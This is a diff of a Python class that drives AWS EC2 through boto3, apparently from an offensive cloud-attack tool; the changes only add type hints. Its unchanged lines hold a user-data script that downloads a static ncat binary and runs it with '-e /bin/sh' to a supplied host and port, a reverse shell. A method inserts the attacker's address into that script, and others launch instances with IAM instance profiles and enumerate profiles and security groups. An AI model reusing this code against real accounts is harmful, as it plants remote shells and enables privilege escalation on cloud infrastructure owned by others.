@@ -5,7 +5,7 @@ from os.path import exists
 
 class Ec2():
 
-    def __init__(self, session, console):
+    def __init__(self, session, console) -> None:
         self.ec2 = session.client("ec2")
         self.console = console
         self.user_data_payload = f"""#!/bin/bash
@@ -14,8 +14,8 @@ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_6
 chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     
     # [START _create_key_pair]
-    def _create_key_pair(self, key_name: str):
-        def _create(key_name: str, dry: bool=True):
+    def _create_key_pair(self, key_name: str) -> None:
+        def _create(key_name: str, dry: bool=True) -> bool:
             try:
                 if not dry:
                     self.console.print(f"> Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
@@ -59,7 +59,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         self, key_name: str = "", ami_id: str = "", security_groups_ids: list = [],
         subnet_id: str = "", instance_type: str = "", instance_profile_arn: str = "",
         user_data: str = ""
-        ):
+        ) -> None:
         try:
             if key_name:
                 results = self.ec2.run_instances(
@@ -104,14 +104,14 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     def launch_ec2_with_instance_profile(
         self, key_name: str, ami_id: str, security_group_ids: list,
         subnet_id: str, instance_type: str, instance_profile_arn: str
-        ):
+        ) -> None:
         self._create_key_pair(key_name)
         sleep(1)
         self._run_instance(key_name, ami_id, security_group_ids, subnet_id, instance_type, instance_profile_arn)
     # [END launch_ec2_with_instance_profile]
 
     # [START user_data_rev_shell]
-    def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int):
+    def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int) -> None:
         self.console.print("> Creating reverse shell user data script.. ([blue]INFO[/blue])")
         self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
         self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
@@ -124,7 +124,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     # [END user_data_rev_shell]
 
     # [START get_instance_profiles]
-    def get_instance_profiles(self):
+    def get_instance_profiles(self) -> list:
         instance_ids = []
         profiles = []
         for profile in self.ec2.describe_iam_instance_profile_associations()["IamInstanceProfileAssociations"]:
@@ -134,7 +134,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     # [END get_instance_profiles]
     
     # [START get_security_groups]
-    def get_security_groups(self):
+    def get_security_groups(self) -> None:
         for security_group in self.ec2.describe_security_groups()["SecurityGroups"]:
             cidrs = []
             descriptions = []
